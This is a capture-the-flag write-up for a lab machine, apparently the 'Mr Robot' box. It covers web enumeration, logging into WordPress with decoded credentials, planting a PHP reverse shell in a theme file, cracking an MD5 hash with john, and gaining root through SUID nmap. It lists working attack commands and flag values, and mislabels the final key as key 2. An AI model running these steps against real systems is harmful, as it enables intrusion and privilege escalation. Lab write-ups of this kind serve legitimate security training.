### Recon
- Nmap Results: ``nmap -A [Target_IP] -p- -oA scan``
### Enumeration
- Open Ports: 
	- **22**/tcp, **ssh**
	- **80**/tcp, **http**, Apache httpd
	- **443**/tcp, **ssl/http**, Apache httpd
- Web Findings:
	- Going to [Target_IP:80] takes us to a site with some presentational videos.
	- gobuster scan provides some useful information
		- `gobuster dir -u [http://[hostname] -w /usr/share/wordlists/dirb/common.txt -t 100 -q -o gobuster_output.txt`
		- Notable directories/files:
			- /robots.txt
				- Provides a path to our first key: `/key-1-of-3.txt`
				- Also provides a wordlist: `/fsocity.dic`
				- Wordlist was downloaded: `http://[Target_IP]/fsocity.dic > dictionary.txt`
			- /license
				- At the bottom of the page we find an encoded string: _ZWxsaW90OkVSMjgtMDY1Mgo=_
				- Decoded the string with CyberChef and got credentials: `elliot`:`ER28-0652`
			- Visited `http://[Target_IP]/login` which redirects to `http://[Target_IP]/wp-login.php`
				- We are now logged in as Elliot Alderson
### Vulnerabilities
- The WP admin page allows us to edit .php files via the template editor.
### Exploitation
- Replaced the php code for one of the template pages with a pentestmonkey [php reverse shell](https://github.com/pentestmonkey/php-reverse-shell).
- Set up a nc listener to wait for a connection.
- Visited `http://[Target_IP]/wp-includes/themes/TwentyFifteen/404.php`.
	- **FIY** - you just have to know where these files are housed. A [google search](https://www.google.com/search?q=where+are+wp+theme+files+housed.+the+directory+name&client=firefox-b-1-d&hs=wSl9&sca_esv=5e591f022fc0b30a&sxsrf=AE3TifOT02jRhuou-q0OXibyvbXSc6lz3Q%3A1767463605576&ei=tVpZaeL5IpmmmtkP_72jiAQ&ved=0ahUKEwiiqPSC---RAxUZkyYFHf_eCEEQ4dUDCBE&uact=5&oq=where+are+wp+theme+files+housed.+the+directory+name&gs_lp=Egxnd3Mtd2l6LXNlcnAiM3doZXJlIGFyZSB3cCB0aGVtZSBmaWxlcyBob3VzZWQuIHRoZSBkaXJlY3RvcnkgbmFtZTIFECEYoAEyBRAhGKABMgUQIRigATIFECEYqwJItShQ2Q9YwSdwAngBkAEAmAH7AaABlxGqAQY2LjEzLjG4AQPIAQD4AQGYAhagAsISwgIKEAAYsAMY1gQYR8ICBhAAGBYYHsICCxAAGIAEGIYDGIoFwgIFEAAY7wXCAggQABiiBBiJBcICBRAhGJ8FmAMAiAYBkAYIkgcGMi4xOS4xoAfefbIHBjAuMTkuMbgHqhLCBwgwLjIuMTcuM8gHaYAIAA&sclient=gws-wiz-serp) can reveal this information.
	- Obtained shell
	- Upgrade shell with ``python -c 'import pty; pty.spawn("/bin/bash")'
	- cd into /home to discover a /robot directory where our `/key-2-of-3.txt` is found. However, access is denied
	- We also find a password.raw_md5 file which by using ``cat`` we find to contain the username and hashed password for our robot user.
	- Put the hash in a file and used john to crack.
		- ``john — format=raw-md5 — wordlist=/usr/share/wordlists/rockyou.txt secret``
		- Password is: _abcdefghijklmnopqrstuvwxyz_
	- We can now view the second key: _822c73956184f694993bede3eb39f959_
### Post Exploitation
- We look for files with root permissions: ``find / -perm -u=s -type f 2>/dev/null``.
### Privilege Escalation
- We find /usr/bin/nmap, which we can abuse to get root.
	- `nmap --interactive`
	- `!sh`
- We are root! `key-2-of-3.txt` is ours.  _04787ddef27c3dee1ee161b21670b4e4_
### Notes
- Not knowing where the WP theme files were located was a hangup. 
- Make sure to be thorough about looking at the entirety of pages we find - I missed the encoded string at the bottom of the /license page.